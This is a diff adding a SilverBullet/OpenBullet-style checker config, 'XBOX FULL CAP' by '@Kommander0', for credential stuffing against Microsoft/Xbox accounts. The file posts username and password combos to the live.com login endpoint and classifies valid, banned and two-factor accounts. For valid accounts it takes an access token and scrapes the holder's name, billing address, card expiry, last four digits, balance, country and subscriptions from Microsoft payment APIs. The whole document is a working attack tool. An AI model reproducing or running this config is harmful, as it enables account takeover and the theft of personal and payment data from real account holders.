@@ -1,0 +1,486 @@
+[SETTINGS]
+{
+  "Name": "XBOX FULL CAP",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2024-01-24T13:20:02.0047586-08:00",
+  "AdditionalInfo": "@Kommander0",
+  "RequiredPlugins": [],
+  "Author": "@Kommander0",
+  "Version": "1.1.4 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "@Kommander0",
+      "VariableName": "",
+      "Id": 1808901199
+    }
+  ],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "z zcsac",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+REQUEST POST "https://login.live.com/ppsecure/post.srf?nopa=2&client_id=000000004420578E&contextid=E5B837C15140B016&opid=F56A1603B30D8E67&bk=1706129223&uaid=b6adb36243d74fc89425aace41d03813&pid=15216" 
+  CONTENT "i13=0&login=<USER>&loginfmt=<USER>&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=<PASS>&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=-DoqJFzATnoBmk6ZrTr3p*I2RMVGav7qhVJrzdk7PGGPFqPhpA1VHykBZgJYsFPfpzee0aP0hgqNxJhC8NcBkyYuAzNhBofXuY*%212aTOzYSVlJyFrNgN0t8fMJb5m9YKiPAfTfa91L5v9HrMqhvdFbNoo3AjtdQozHoLf8DScdoDVCfl6z6pgUDyJsLdOBwYMXA%24%24&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&isRecoveryAttemptPost=0&i19=36463" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: login.live.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Referer: https://login.live.com/oauth20_authorize.srf?redirect_uri=https://sisu.xboxlive.com/connect/oauth/XboxLive&response_type=code&state=LAAAAAEB2k8GezIFfeVWhZoMSDMYgQydIzsGndI263IThwTPFM_5KejaKJzTZDIxMTZmMmY3M2M2NDM5NGE5YzE2MDE3NTViZGU0MDYzIGk0QmRxQ2VUWVVXcGpaRnhBQjN3ZmcuMA&client_id=000000004420578E&scope=XboxLive.Signin%20+XboxLive.offline_access&lw=1&fl=dob,easi2&xsup=1&uaid=b6adb36243d74fc89425aace41d03813&nopa=2" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Content-Length: 565" 
+  HEADER "Origin: https://login.live.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Cookie: MSPRequ=id=N&lt=1706129223&co=1; uaid=b6adb36243d74fc89425aace41d03813; MSCC=102.189.123.79-EG; OParams=11O.Dnq*G4LdEEr23cnHXm3Ug3*d13yl3YLWco!8*RU6kMUNtayX2C1TvurFv3ohIajXknxOGP0fdZAtmBCAHsFb*OiW9jNDMVw2gAycNeAuceOw7NRWui9zCdfEnVzw*715Q9BYuFwHF!0otJ3G2WllttTWvPSkiABYg3iHXOvRcxQDl5L7WkEYKdKL4q82XNl6!!NyplbnM*vH*bCv2WpUeaiwQ4U7uuzPpZiRmGpese933WV6yyO2!cKcgi7!G8ktZ9vnIJ18fVIbTwm2zcVGudpn5N*WrNQp0wffGjOYheTuURyUCSCJSiorOuVeVPyOQFU2Qn2rPbKVi48u6IJTxU1o836YZDqFOVfwtpXkYlnLYq9OIFmebSC6W3cc*333OUpgKERGO2qZfcUHBzPOyPuhboaL01bBL2xk8DU5AuxWXdRxxOvz*KLMGLTKeWBeVOG863LxF*WFr5A3acot1hX3h4d40l41YoFeDWZ2dbNrHzrixakbsIRBlea!I7TnDHCplLEqKuye98kLw7fF!ZrSA1vYdjksY6L03DcWFiHqiTQPhKMr9TVFwvI0P7Jezw$$; MicrosoftApplicationsTelemetryDeviceId=75b45615-5c3a-4b8a-9789-c2534fc7b6f7; MSPOK=$uuid-e2e64a02-a061-4caf-a191-f55f4bc848df$uuid-3fb18fc1-19ed-4d50-a524-84c4286edfd2; ai_session=igX+GY1Gc9U/bn9aaSdixO|1706129266980|1706129266980; wlidperf=FR=L&ST=1706129271373" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-User: ?1" 
+
+#KEYCHECK KEYCHECK 
+  KEYCHAIN Failure AND 
+    KEY "Your account or password is incorrect." 
+    KEY "That Microsoft account doesn\\'t exist. Enter a different account" 
+    KEY "Sign in to your Microsoft account" 
+  KEYCHAIN Ban OR 
+    KEY ",AC:null,urlFedConvertRename" 
+  KEYCHAIN Failure OR 
+    KEY "timed out" 
+  KEYCHAIN Success OR 
+    KEY "<COOKIES>" Contains "ANON" 
+    KEY "<COOKIES>" Contains "WLSSC" 
+    KEY "<ADDRESS>" Contains "https://login.live.com/oauth20_desktop.srf?" 
+    KEY "sSigninName" 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "account.live.com/recover?mkt" 
+    KEY "recover?mkt" 
+    KEY "account.live.com/identity/confirm?mkt" 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "Email/Confirm?mkt" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "/cancel?mkt=" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "/Abuse?mkt=" 
+
+#KEYCHECK KEYCHECK 
+  KEYCHAIN Failure AND 
+    KEY "Sign in to your Microsoft account" 
+  KEYCHAIN Ban OR 
+    KEY ",AC:null,urlFedConvertRename" 
+  KEYCHAIN Success OR 
+    KEY "<COOKIES>" Contains "ANON" 
+    KEY "<COOKIES>" Contains "WLSSC" 
+    KEY "<ADDRESS>" Contains "https://login.live.com/oauth20_desktop.srf?" 
+    KEY "sSigninName" 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "account.live.com/recover?mkt" 
+    KEY "recover?mkt" 
+    KEY "account.live.com/identity/confirm?mkt" 
+
+#Get REQUEST GET "https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=%7B%22userId%22%3A%22bf3383c9b44aa8c9%22%2C%22scopeSet%22%3A%22pidl%22%7D&prompt=none" 
+  
+  HEADER "Host: login.live.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Connection: close" 
+  HEADER "Referer: https://account.microsoft.com/" 
+
+PARSE "<ADDRESS>" LR "access_token=" "&token_type" -> VAR "ATK" 
+
+#urlDecode FUNCTION URLDecode "<Token>" -> VAR "urlDecode" 
+
+#PAYMENT REQUEST GET "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Authorization: MSADELEGATE1.0=\"<ATK>\"" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Host: paymentinstruments.mp.microsoft.com" 
+  HEADER "ms-cV: FbMB+cD6byLL1mn4W/NuGH.2" 
+  HEADER "Origin: https://account.microsoft.com" 
+  HEADER "Referer: https://account.microsoft.com/" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "Sec-GPC: 1" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<SOURCE>" DoesNotContain "lastFourDigits\":\"" 
+  KEYCHAIN Success OR 
+    KEY "lastFourDigits\":\"" 
+
+PARSE "<SOURCE>" LR "\"accountHolderName\":\"" "\"" CreateEmpty=FALSE -> CAP "Fullname" 
+
+PARSE "<SOURCE>" LR "\"address\":{\"address_line1\":\"" "\"" -> VAR "Address1" 
+
+PARSE "<SOURCE>" JSON "city" -> VAR "City" 
+
+PARSE "<SOURCE>" JSON "region" -> VAR "Region" 
+
+PARSE "<SOURCE>" JSON "postal_code" -> VAR "Zipcode" 
+
+#UserAddress FUNCTION Constant "[ Address: <Address1>, City: <City>, State: <Region>, Postalcode: <Zipcode> ]" -> CAP "UserAddress" 
+
+PARSE "<SOURCE>" LR "balance\":" ",\"" CreateEmpty=FALSE -> CAP "Balance" "$" "" 
+
+PARSE "<SOURCE>" LR "accountHolderName\":\"" "\",\"" -> VAR "CardHolder" 
+
+PARSE "<SOURCE>" LR "paymentMethodFamily\":\"credit_card\",\"display\":{\"name\":\"" "\"" -> VAR "Creditcard" 
+
+PARSE "<SOURCE>" LR "expiryMonth\":\"" "\"," -> VAR "expiryMonth" 
+
+PARSE "<SOURCE>" LR "expiryYear\":\"" "\"," -> VAR "expiryYear" 
+
+PARSE "<SOURCE>" LR "lastFourDigits\":\"" "\"," -> VAR "Last4" 
+
+PARSE "<SOURCE>" JSON "cardType" -> VAR "cardType" 
+
+FUNCTION Constant "[CardHolder: <CardHolder> | CC: <Creditcard> | CC expiryMonth: <expiryMonth> | CC ExpYear: <expiryYear> | CC Last4Digit: <Last4> | CC Funding: <cardType>]" -> CAP "CardInfo" 
+
+PARSE "<SOURCE>" JSON "country" -> VAR "COD" 
+
+FUNCTION Translate 
+  KEY "AF" VALUE "Afghanistan" 
+  KEY "AL" VALUE "Albania" 
+  KEY "DZ" VALUE "Algeria" 
+  KEY "AS" VALUE "American Samoa" 
+  KEY "AD" VALUE "Andorra" 
+  KEY "AO" VALUE "Angola" 
+  KEY "AI" VALUE "Anguilla" 
+  KEY "AQ" VALUE "Antarctica" 
+  KEY "AG" VALUE "Antigua And Barbuda" 
+  KEY "AR" VALUE "Argentina" 
+  KEY "AM" VALUE "Armenia" 
+  KEY "AW" VALUE "Aruba" 
+  KEY "AU" VALUE "Australia" 
+  KEY "AT" VALUE "Austria" 
+  KEY "AZ" VALUE "Azerbaijan" 
+  KEY "BS" VALUE "Bahamas" 
+  KEY "BH" VALUE "Bahrain" 
+  KEY "BD" VALUE "Bangladesh" 
+  KEY "BB" VALUE "Barbados" 
+  KEY "BY" VALUE "Belarus" 
+  KEY "BE" VALUE "Belgium" 
+  KEY "BZ" VALUE "Belize" 
+  KEY "BJ" VALUE "Benin" 
+  KEY "BM" VALUE "Bermuda" 
+  KEY "BT" VALUE "Bhutan" 
+  KEY "BO" VALUE "Bolivia" 
+  KEY "BA" VALUE "Bosnia and Herzegovina" 
+  KEY "BW" VALUE "Botswana" 
+  KEY "BV" VALUE "Bouvet Island" 
+  KEY "BR" VALUE "Brazil" 
+  KEY "IO" VALUE "British Indian Ocean Territory" 
+  KEY "BN" VALUE "Brunei" 
+  KEY "BG" VALUE "Bulgaria" 
+  KEY "BF" VALUE "Burkina Faso" 
+  KEY "BI" VALUE "Burundi" 
+  KEY "KH" VALUE "Cambodia" 
+  KEY "CM" VALUE "Cameroon" 
+  KEY "CA" VALUE "Canada" 
+  KEY "CV" VALUE "Cape Verde" 
+  KEY "KY" VALUE "Cayman Islands" 
+  KEY "CF" VALUE "Central African Republic" 
+  KEY "TD" VALUE "Chad" 
+  KEY "CL" VALUE "Chile" 
+  KEY "CN" VALUE "China" 
+  KEY "CX" VALUE "Christmas Island" 
+  KEY "CC" VALUE "Cocos (Keeling) Islands" 
+  KEY "CO" VALUE "Colombia" 
+  KEY "KM" VALUE "Comoros" 
+  KEY "CG" VALUE "Congo" 
+  KEY "CK" VALUE "Cook Islands" 
+  KEY "CR" VALUE "Costa Rica" 
+  KEY "CI" VALUE "Cote D&#39;Ivoire (Ivory Coast)" 
+  KEY "HR" VALUE "Croatia (Hrvatska)" 
+  KEY "CU" VALUE "Cuba" 
+  KEY "CY" VALUE "Cyprus" 
+  KEY "CZ" VALUE "Czech Republic" 
+  KEY "DK" VALUE "Denmark" 
+  KEY "DJ" VALUE "Djibouti" 
+  KEY "DM" VALUE "Dominica" 
+  KEY "DO" VALUE "Dominican Republic" 
+  KEY "TP" VALUE "East Timor" 
+  KEY "EC" VALUE "Ecuador" 
+  KEY "EG" VALUE "Egypt" 
+  KEY "SV" VALUE "El Salvador" 
+  KEY "GQ" VALUE "Equatorial Guinea" 
+  KEY "ER" VALUE "Eritrea" 
+  KEY "EE" VALUE "Estonia" 
+  KEY "ET" VALUE "Ethiopia" 
+  KEY "FK" VALUE "Falkland Islands (Islas Malvinas)" 
+  KEY "FO" VALUE "Faroe Islands" 
+  KEY "FJ" VALUE "Fiji Islands" 
+  KEY "FI" VALUE "Finland" 
+  KEY "FR" VALUE "France" 
+  KEY "GF" VALUE "French Guiana" 
+  KEY "PF" VALUE "French Polynesia" 
+  KEY "TF" VALUE "French Southern Territories" 
+  KEY "GA" VALUE "Gabon" 
+  KEY "GM" VALUE "Gambia, The" 
+  KEY "GE" VALUE "Georgia" 
+  KEY "DE" VALUE "Germany" 
+  KEY "GH" VALUE "Ghana" 
+  KEY "GI" VALUE "Gibraltar" 
+  KEY "GR" VALUE "Greece" 
+  KEY "GL" VALUE "Greenland" 
+  KEY "GD" VALUE "Grenada" 
+  KEY "GP" VALUE "Guadeloupe" 
+  KEY "GU" VALUE "Guam" 
+  KEY "GT" VALUE "Guatemala" 
+  KEY "GN" VALUE "Guinea" 
+  KEY "GW" VALUE "Guinea-Bissau" 
+  KEY "GY" VALUE "Guyana" 
+  KEY "HT" VALUE "Haiti" 
+  KEY "HM" VALUE "Heard and McDonald Islands" 
+  KEY "HN" VALUE "Honduras" 
+  KEY "HK" VALUE "Hong Kong S.A.R." 
+  KEY "HU" VALUE "Hungary" 
+  KEY "IS" VALUE "Iceland" 
+  KEY "IN" VALUE "India" 
+  KEY "ID" VALUE "Indonesia" 
+  KEY "IR" VALUE "Iran" 
+  KEY "IQ" VALUE "Iraq" 
+  KEY "IE" VALUE "Ireland" 
+  KEY "IL" VALUE "Israel" 
+  KEY "IT" VALUE "Italy" 
+  KEY "JM" VALUE "Jamaica" 
+  KEY "JP" VALUE "Japan" 
+  KEY "JO" VALUE "Jordan" 
+  KEY "KZ" VALUE "Kazakhstan" 
+  KEY "KE" VALUE "Kenya" 
+  KEY "KI" VALUE "Kiribati" 
+  KEY "KR" VALUE "Korea" 
+  KEY "KP" VALUE "Korea, North" 
+  KEY "KW" VALUE "Kuwait" 
+  KEY "KG" VALUE "Kyrgyzstan" 
+  KEY "LA" VALUE "Laos" 
+  KEY "LV" VALUE "Latvia" 
+  KEY "LB" VALUE "Lebanon" 
+  KEY "LS" VALUE "Lesotho" 
+  KEY "LR" VALUE "Liberia" 
+  KEY "LY" VALUE "Libya" 
+  KEY "LI" VALUE "Liechtenstein" 
+  KEY "LT" VALUE "Lithuania" 
+  KEY "LU" VALUE "Luxembourg" 
+  KEY "MO" VALUE "Macau S.A.R." 
+  KEY "MK" VALUE "Macedonia" 
+  KEY "MG" VALUE "Madagascar" 
+  KEY "MW" VALUE "Malawi" 
+  KEY "MY" VALUE "Malaysia" 
+  KEY "MV" VALUE "Maldives" 
+  KEY "ML" VALUE "Mali" 
+  KEY "MT" VALUE "Malta" 
+  KEY "MH" VALUE "Marshall Islands" 
+  KEY "MQ" VALUE "Martinique" 
+  KEY "MR" VALUE "Mauritania" 
+  KEY "MU" VALUE "Mauritius" 
+  KEY "YT" VALUE "Mayotte" 
+  KEY "MX" VALUE "Mexico" 
+  KEY "FM" VALUE "Micronesia" 
+  KEY "MD" VALUE "Moldova" 
+  KEY "MC" VALUE "Monaco" 
+  KEY "MN" VALUE "Mongolia" 
+  KEY "ME" VALUE "Montenegro" 
+  KEY "MS" VALUE "Montserrat" 
+  KEY "MA" VALUE "Morocco" 
+  KEY "MZ" VALUE "Mozambique" 
+  KEY "MM" VALUE "Myanmar" 
+  KEY "NA" VALUE "Namibia" 
+  KEY "NR" VALUE "Nauru" 
+  KEY "NP" VALUE "Nepal" 
+  KEY "AN" VALUE "Netherlands Antilles" 
+  KEY "NL" VALUE "Netherlands, The" 
+  KEY "NC" VALUE "New Caledonia" 
+  KEY "NZ" VALUE "New Zealand" 
+  KEY "NI" VALUE "Nicaragua" 
+  KEY "NE" VALUE "Niger" 
+  KEY "NG" VALUE "Nigeria" 
+  KEY "NU" VALUE "Niue" 
+  KEY "NF" VALUE "Norfolk Island" 
+  KEY "MP" VALUE "Northern Mariana Islands" 
+  KEY "NO" VALUE "Norway" 
+  KEY "OM" VALUE "Oman" 
+  KEY "PK" VALUE "Pakistan" 
+  KEY "PW" VALUE "Palau" 
+  KEY "PA" VALUE "Panama" 
+  KEY "PG" VALUE "Papua new Guinea" 
+  KEY "PY" VALUE "Paraguay" 
+  KEY "PE" VALUE "Peru" 
+  KEY "PH" VALUE "Philippines" 
+  KEY "PN" VALUE "Pitcairn Island" 
+  KEY "PL" VALUE "Poland" 
+  KEY "PT" VALUE "Portugal" 
+  KEY "PR" VALUE "Puerto Rico" 
+  KEY "QA" VALUE "Qatar" 
+  KEY "RE" VALUE "Reunion" 
+  KEY "RO" VALUE "Romania" 
+  KEY "RU" VALUE "Russia" 
+  KEY "RW" VALUE "Rwanda" 
+  KEY "SH" VALUE "Saint Helena" 
+  KEY "KN" VALUE "Saint Kitts And Nevis" 
+  KEY "LC" VALUE "Saint Lucia" 
+  KEY "PM" VALUE "Saint Pierre and Miquelon" 
+  KEY "VC" VALUE "Saint Vincent And The Grenadines" 
+  KEY "WS" VALUE "Samoa" 
+  KEY "SM" VALUE "San Marino" 
+  KEY "ST" VALUE "Sao Tome and Principe" 
+  KEY "SA" VALUE "Saudi Arabia" 
+  KEY "SN" VALUE "Senegal" 
+  KEY "RS" VALUE "Serbia" 
+  KEY "SC" VALUE "Seychelles" 
+  KEY "SL" VALUE "Sierra Leone" 
+  KEY "SG" VALUE "Singapore" 
+  KEY "SK" VALUE "Slovakia" 
+  KEY "SI" VALUE "Slovenia" 
+  KEY "SB" VALUE "Solomon Islands" 
+  KEY "SO" VALUE "Somalia" 
+  KEY "ZA" VALUE "South Africa" 
+  KEY "GS" VALUE "South Georgia" 
+  KEY "ES" VALUE "Spain" 
+  KEY "LK" VALUE "Sri Lanka" 
+  KEY "SD" VALUE "Sudan" 
+  KEY "SR" VALUE "Suriname" 
+  KEY "SJ" VALUE "Svalbard And Jan Mayen Islands" 
+  KEY "SZ" VALUE "Swaziland" 
+  KEY "SE" VALUE "Sweden" 
+  KEY "CH" VALUE "Switzerland" 
+  KEY "SY" VALUE "Syria" 
+  KEY "TW" VALUE "Taiwan" 
+  KEY "TJ" VALUE "Tajikistan" 
+  KEY "TZ" VALUE "Tanzania" 
+  KEY "TH" VALUE "Thailand" 
+  KEY "TG" VALUE "Togo" 
+  KEY "TK" VALUE "Tokelau" 
+  KEY "TO" VALUE "Tonga" 
+  KEY "TT" VALUE "Trinidad And Tobago" 
+  KEY "TN" VALUE "Tunisia" 
+  KEY "TR" VALUE "Turkey" 
+  KEY "TM" VALUE "Turkmenistan" 
+  KEY "TC" VALUE "Turks And Caicos Islands" 
+  KEY "TV" VALUE "Tuvalu" 
+  KEY "UG" VALUE "Uganda" 
+  KEY "UA" VALUE "Ukraine" 
+  KEY "AE" VALUE "United Arab Emirates" 
+  KEY "GB" VALUE "United Kingdom" 
+  KEY "US" VALUE "United States" 
+  KEY "UM" VALUE "United States Minor Outlying Islands" 
+  KEY "UY" VALUE "Uruguay" 
+  KEY "UZ" VALUE "Uzbekistan" 
+  KEY "VU" VALUE "Vanuatu" 
+  KEY "VA" VALUE "Vatican City State (Holy See)" 
+  KEY "VE" VALUE "Venezuela" 
+  KEY "VN" VALUE "Vietnam" 
+  KEY "VG" VALUE "Virgin Islands (British)" 
+  KEY "VI" VALUE "Virgin Islands (US)" 
+  KEY "WF" VALUE "Wallis And Futuna Islands" 
+  KEY "YE" VALUE "Yemen" 
+  KEY "YU" VALUE "Yugoslavia" 
+  KEY "ZM" VALUE "Zambia" 
+  KEY "ZW" VALUE "Zimbabwe" 
+  "<COD>" -> CAP "Country" 
+
+#TRANSACTIONS REQUEST GET "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Authorization: MSADELEGATE1.0=\"<ATK>\"" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Host: paymentinstruments.mp.microsoft.com" 
+  HEADER "ms-cV: FbMB+cD6byLL1mn4W/NuGH.2" 
+  HEADER "Origin: https://account.microsoft.com" 
+  HEADER "Referer: https://account.microsoft.com/" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "Sec-GPC: 1" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "\"orders\":[]" 
+    KEY "\"subscriptions\":[]}" 
+  KEYCHAIN Success OR 
+    KEY "\"title\":\"" 
+    KEY "\"subscriptions\":[{\"" 
+    KEY "\"orders\":[{\"" 
+
+PARSE "<SOURCE>" LR "title\":\"" "\"," CreateEmpty=FALSE -> CAP "Subscription" 
+
+PARSE "<SOURCE>" LR "quantity\":" ",\"" CreateEmpty=FALSE -> CAP "Quantity" 
+
+PARSE "<SOURCE>" LR "description\":\"" "\"," CreateEmpty=FALSE -> CAP "Description" 
+
+PARSE "<SOURCE>" LR "\"productType\":\"" "\"" -> VAR "PT" 
+
+FUNCTION Translate 
+  KEY "PASS" VALUE "XBOX GAME PASS" 
+  KEY "GOLD" VALUE "XBOX GOLD" 
+  "<PT>" -> CAP "Product Type" 
+
+PARSE "<SOURCE>" JSON "currency" -> VAR "CUR" 
+
+PARSE "<SOURCE>" JSON "totalAmount" -> CAP "Price" "" " <CUR>" 
+
+FUNCTION Constant "@Kommander0" -> CAP "By" 
+
